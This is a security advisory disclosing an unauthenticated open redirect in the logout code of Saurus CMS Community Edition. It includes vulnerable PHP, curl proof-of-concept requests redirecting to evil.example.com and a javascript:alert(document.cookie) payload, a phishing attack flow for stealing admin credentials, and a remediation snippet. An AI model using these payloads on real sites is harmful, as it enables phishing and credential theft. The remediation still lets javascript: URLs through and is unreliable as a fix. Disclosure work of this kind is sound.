# Saurus CMS Community Edition - Unauthenticated Open Redirect on Logout

**Affected versions:** All versions through 4.7.FINAL (commit d886e5b)

**CWE:** CWE-601 - URL Redirection to Untrusted Site (Open Redirect)

**CVSS v3.1:** 6.1 MEDIUM - AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

**Authentication required:** None

---

## Summary

Saurus CMS Community Edition through version 4.7.FINAL (latest commit d886e5b) contains an unauthenticated open redirect vulnerability in the logout handling code in classes/port.inc.php. The url parameter supplied via GET or POST is passed directly to the Location header without validation, allowing attackers to redirect users to arbitrary external domains after logout. This can enable phishing, credential theft, OAuth redirect abuse, and redirects to javascript: URIs in legacy clients.

---

## Vulnerable Code

File: `classes/port.inc.php` lines 322-362

```php
if ($_GET["op"] == 'logout' || $_POST["op"] == 'logout') {

    session_destroy();
    unset($_SESSION["user_id"]);

    $url = $_GET["url"] ? $_GET["url"] : $_POST["url"];

    if (!$url) {
        $url = 'index.php';
    }

    setcookie("logged", "0", time()-36600);

    header("Location: " . $url);   // No domain check, no scheme check
    exit;
}
```

The `url` parameter is taken from GET or POST and placed directly into the Location response header with no domain allowlist, no scheme validation, and no enforcement of relative paths.

---

## Steps to Reproduce

1. Log in to the Saurus CMS admin panel.
2. Click logout and intercept the logout request in Burp Suite.
3. The original request is:

```
GET /admin/index.php?op=logout HTTP/1.1
Host: localhost:9080
```

4. Modify the request to include an external url parameter:

```
GET /admin/index.php?op=logout&url=https://phishing-site.com/cms-login HTTP/1.1
Host: localhost:9080
```

5. Forward the request.

**Observed result:**
The application responds with HTTP 302 and redirects the user to https://phishing-site.com/cms-login.

**Expected result:**
The application should only redirect to a trusted internal path and should reject external domains or unsafe URI schemes.

---

## Proof of Concept

Environment:
- Docker: MariaDB 10.6 + PHP 5.6 Apache
- Target: http://localhost:9080
- Authentication: None required

**GET-based redirect:**

```bash
curl -v "http://localhost:9080/index.php?op=logout&url=https://evil.example.com" 2>&1 | grep "Location:"
```

Response:
```
HTTP/1.1 302 Found
Location: https://evil.example.com
```

**POST-based redirect:**

```bash
curl -v -X POST -d "op=logout&url=https://evil.example.com" \
  "http://localhost:9080/index.php" 2>&1 | grep "Location:"
```

Response:
```
HTTP/1.1 302 Found
Location: https://evil.example.com
```

**Admin panel endpoint:**

```bash
curl -v "http://localhost:9080/admin/index.php?op=logout&url=https://evil.example.com" 2>&1 | grep "Location:"
```

Response:
```
HTTP/1.1 302 Found
Location: https://evil.example.com
```

**javascript: scheme accepted:**

```bash
curl -v "http://localhost:9080/index.php?op=logout&url=javascript:alert(document.cookie)" 2>&1 | grep "Location:"
```

Response:
```
HTTP/1.1 302 Found
Location: javascript:alert(document.cookie)
```

---

## Impact

An attacker crafts a logout URL and sends it to a CMS admin:

```
https://victim-cms.com/admin/index.php?op=logout&url=https://phishing-site.com/cms-login
```

Attack flow:
1. Admin clicks the crafted link
2. CMS destroys their real session - they are genuinely logged out
3. Browser follows 302 redirect to the attacker-controlled phishing page
4. Admin sees a fake CMS login page and enters credentials
5. Attacker captures the credentials

The attack is highly convincing because the session is destroyed before the redirect, so the victim believes they safely logged out.

---

## Remediation

Reject absolute URLs and only allow relative paths:

```php
$url = $_GET["url"] ? $_GET["url"] : $_POST["url"];

if ($url && (strpos($url, '://') !== false || substr($url, 0, 2) === '//')) {
    $url = 'index.php';
}

header("Location: " . $url);
```

---

## Timeline

| Date | Event |
|---|---|
| 2026-05-25 | Vulnerability discovered during independent security audit |
| 2026-05-25 | Confirmed live - GET, POST, admin path, javascript: scheme all verified |
| 2026-06-01 | CVE requested via MITRE |

---

## References

- https://github.com/sauruscms/Saurus-CMS-Community-Edition/blob/d886e5b/classes/port.inc.php
- https://github.com/sauruscms/Saurus-CMS-Community-Edition
- https://cwe.mitre.org/data/definitions/601.html
- https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

---

## Credits

Discovered by Vaibhav Kubade (vaibhavpkubade01@gmail.com)
